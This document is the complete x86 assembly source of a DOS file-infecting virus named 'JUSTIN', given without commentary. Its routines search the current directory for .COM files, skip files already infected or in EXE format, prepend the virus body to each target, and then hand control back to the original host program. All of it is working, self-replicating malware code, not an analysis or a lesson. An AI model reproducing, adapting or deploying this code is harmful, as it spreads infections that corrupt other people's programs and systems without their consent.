.model small
.code
	org 100h
JUSTIN:
	call CHECK_MEMORY
	jc GOTO_HOST_LOW
	call JUMP_HIGH
	call FIND_FILE
	jc GOTO_HOST_HIGH
	call INFECT_FILE

GOTO_HOST_HIGH:
	mov di,100h
	mov si, offset HOST
	mov ax,ss
	mov ds,ax
	mov es,ax
	push ax
	push di
	mov cx,sp
	sub cx,offset HOST
	rep movsb
	retf
	
GOTO_HOST_LOW:
	mov ax,100h
	push ax
	mov ax,sp
	sub ax,6
	push ax
	
	mov ax,000C3h
	push ax
	mov ax,0A4F3h
	push ax
	
	mov si,offset HOST
	mov di,100h
	mov cx,sp
	sub cx,offset HOST
	
	cli
	add sp,4
	
	ret

CHECK_MEMORY:
	mov ah,4ah
	mov bx,2000h
	int 21h
	pushf
	mov ah,4ah
	mov bx,0ffffh
	int 21h
	mov ah,4ah
	int 21h
	popf
	ret
	
JUMP_HIGH:
	mov ax,ds
	add ax,1000h
	mov es,ax
	mov si,100h
	mov di,si
	mov cx,offset HOST - 100h
	rep movsb
	mov ds,ax
	mov ah,1ah
	mov dx,80h
	int 21h
	pop ax
	push es
	push ax
	retf
	
FIND_FILE:
	mov dx,offset COM_MASK
	mov ah,4eh
	xor cx,cx
FIND_LOOP:
	int 21h
	jc FIND_EXIT
	call FILE_OK
	jc FIND_NEXT
FIND_EXIT:
	ret
FIND_NEXT:
	mov ah,4fh
	jmp FIND_LOOP
COM_MASK	DB	'*.COM',0

FILE_OK:
	mov dx,9eh
	mov ax,3D02h
	int 21h
	jc FOK_EXIT_C
	mov bx,ax
	mov ax,4202h
	xor cx,cx
	xor dx,dx
	int 21h
	jc FOK_EXIT_CCF
	or dx,dx
	jnz FOK_EXIT_CCF
	mov cx,ax
	add ax,offset HOST
	cmp ax,0ff00h
	jnc FOK_EXIT_CCF
	push cx
	mov ax,4200h
	xor cx,cx
	xor dx,dx
	int 21h
	pop cx
	push cx
	mov ah,3fh
	mov dx,offset host
	int 21h
	pop dx
	jc FOK_EXIT_CCF
	mov si,100h
	mov di,offset HOST
	mov cx,10
	repz cmpsw
	jz FOK_EXIT_CCF
	cmp WORD PTR cs:[HOST],'ZM'
	jz FOK_EXIT_CCF
	clc
	ret
	
FOK_EXIT_CCF:
	mov ah,3eh
	int 21h
FOK_EXIT_C:
	stc
	ret
	
INFECT_FILE:
	push dx
	mov ax,4200h
	xor cx,cx
	xor dx,dx
	int 21h
	pop cx
	add cx,OFFSET HOST-100h
	mov dx,100h
	mov ah,40h
	int 21h
	mov ah,3eh
	int 21h
	ret
	
HOST:
	mov ax,4c00h
	int 21h
	
END JUSTIN
	
